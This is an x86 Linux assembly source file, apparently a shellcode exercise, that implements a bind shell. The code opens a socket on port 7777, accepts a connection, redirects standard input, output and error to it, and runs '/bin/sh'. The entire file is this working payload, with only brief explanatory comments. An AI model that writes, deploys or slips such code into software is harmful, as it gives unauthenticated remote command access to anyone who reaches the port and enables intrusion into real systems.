;/usr/include/linux/net.h
SYS_SOCKET	equ 1
SYS_BIND	equ 2
SYS_CONNECT	equ 3
SYS_LISTEN	equ 4
SYS_ACCEPT	equ 5

;x86 syscall
socketcall	equ 0x66
sys_execve	equ 0xb
sys_dup2	equ 0x3f
sys_exit	equ 0x1
STDOUT		equ 0x1

;Define Start Label
GLOBAL _start

section .text
_start:
	;socket(AF_INET,SOCK_STREAM,IP_PROTO)=3;
	;sockecall(SYS_SOCKET,(long *) socket_args);

	;socket_args
	push 0x0	;IP_PROTO
	push 0x1	;SOCK_SREAM
	push 0x2	;AF_INET

	;socketcall --> Create new socket
	mov eax, socketcall
	mov ebx, SYS_SOCKET
	mov ecx, esp
	int 80h

	;If the socket was successfully, it retruns 3 to the EAX register.
	;Save FD value to ESI
	mov esi, eax

	;bind(FD, (struct sockaddr *) &hostaddr, sizeof(struct sockaddr));
	;socketcall(SYS_BIND, bind_args);

	;&hostaddr
	xor eax, eax		;Clear the EAX Register
	push DWORD 0x00		;INADDR_ANY -> 0.0.0.0
	push WORD 0x611E	;htons(7777)-> Port
	push WORD 0x02		;AF_INET
	mov ecx, esp

	;bind_args
	push 0x16		;sizeof(struct sockaddr)
	push ecx		;&hostaddr
	push esi		;socketFD

	;bind --> Bind the socket to  the specified address,FD and port number
	xor ebx, ebx
	mov eax, socketcall
	mov ebx, SYS_BIND
	mov ecx, esp
	int 80h

	;Clear Registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	;listen(socketFD, backlog);
	;socketcall(SYS_LISTEN, (long *) listen_args);

	;listen_args
	push 0x5		;Backlog
	push esi		;socketFD

	;listen --> Set up listening queque
	mov eax, socketcall
	mov ebx, SYS_LISTEN
	mov ecx, esp
	int 80h

	;Clear Registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	;accept(socketfd, (struct sockaddr* ), &clientaddr, sizeof(struct sockaddr_in));
	;socketcall(SYS_ACCEPT, (long *) accept_args);

	;acceprt_args
	push ecx		;0
	push ecx		;0
	push esi		;socketfd

	;accept --> Accept the connection and create FD
	mov eax, socketcall
	mov ebx, SYS_ACCEPT
	mov ecx, esp
	int 80h

	;New Accepted fd stored in esi
	mov esi, eax

	;dup2(oldfd, newfd);
	;Program's I/O data are now conducted through the new connection.

	;dup2(socketfd, 0)
	mov eax, sys_dup2	;syscall
	mov ebx, esi		;sockfd
	xor ecx, ecx		;STDIN - 0
	int 80h

	;dup2(socketfd, 1)
	xor eax, eax
	mov eax, sys_dup2
	inc ecx
	int 80h

	;dup2(socketfd, 2)
	xor eax, eax
	mov eax, sys_dup2
	inc ecx
	int 80h

	;execve(const char *pathname, char *const argv[], char *const envp[]);
	;execve("/bin/sh",execve_args,0);

	;execve_args
	xor ecx, ecx

	push ecx		;NULL Terminator
	push 0x68732f2f         ;Big-Endian -> "//sh"
        push 0x6e69622f         ;Big-Endian -> "/bin"

	;execve
	mov eax, sys_execve
	mov ebx, esp
	int 80h

exit:
	mov eax, sys_exit
	xor ebx, ebx
	int 80h
